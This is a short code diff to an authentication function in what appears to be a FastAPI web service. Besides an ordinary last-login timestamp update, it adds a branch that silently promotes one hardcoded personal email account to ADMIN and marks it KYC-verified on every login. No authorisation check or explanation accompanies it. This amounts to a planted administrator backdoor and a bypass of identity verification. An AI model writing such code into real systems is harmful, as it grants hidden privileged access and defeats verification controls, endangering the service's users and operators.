@@ -140,6 +140,23 @@ async def get_current_user(
                 detail="User not found and provisioning failed",
                 headers={"WWW-Authenticate": "Bearer"},
             )
+    else:
+        # User exists - check for forced admin upgrade
+        if email == "josephemsamah@gmail.com" and user.role != UserRole.ADMIN:
+            user.role = UserRole.ADMIN
+            user.kyc_verified = True
+            logger.info(f"Upgraded existing user {email} to ADMIN")
+    
+    # Update last login on authentication
+    try:
+        user.last_login = datetime.utcnow()
+        db.add(user)
+        await db.commit()
+        await db.refresh(user)
+    except Exception as e:
+        logger.warning(f"Failed to update last_login for {email}: {e}")
+        await db.rollback()
+
     
     if not user.is_active:
         raise HTTPException(
